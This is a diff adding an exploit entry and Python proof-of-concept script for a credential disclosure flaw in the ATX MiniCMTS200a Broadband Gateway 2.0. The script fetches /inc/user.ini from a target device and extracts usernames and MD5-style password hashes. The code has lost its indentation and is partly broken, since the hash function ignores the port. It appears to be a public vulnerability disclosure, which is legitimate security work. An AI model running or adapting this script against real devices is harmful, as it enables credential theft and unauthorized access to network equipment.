@@ -1,0 +1,45 @@
+# Exploit Title: ATX MiniCMTS200a Broadband Gateway 2.0 - Credential Disclosure
+# Date: 2020-11-20
+# Exploit Author: Zagros Bingol
+# Vendor Homepage: http://www.atx.com
+# Software Link: https://atx.com/products/commercial-services-gateways/minicmts200a-broadband-gateway/
+# Version: 2.0 and earlier
+# Tested on: Debian 10 64bit
+
+-------------------------------------
+
+Endpoint:
+http://www.ip/domain.com/inc/user.ini
+
+--------------------------------------
+
+Proof-of-Concept:
+
+#!/usr/bin/python3
+#License: GNU General Public license v3.0
+#Author: Zagros Bingol(Zagrosbingol@outlook.com)
+
+
+import requests
+import re
+
+target = input("Target(ex:http://host): \n")
+port = input("Port: \n")
+
+
+def sploit(target, port):
+print("ATX/PicoDigital MiniCMTS200a Broadband Gateway v2.0 -
+Credential Disclosure\n")
+r = requests.post(target + ":" + port + '/inc/user.ini')
+searching = re.findall(r"\[.{1,8}\]", str(r.text))
+print("Usernames:\n")
+print(", ".join(searching).replace("[", "").replace("]", ""))
+
+def hash():
+r = requests.post(target + '/inc/user.ini')
+searching = re.findall(r"([a-fA-F\d]{32})", str(r.text))
+print("Hashes:\n")
+print(", ".join(searching).replace("[", "").replace("]", ""))
+hash()
+
+sploit(target, port)
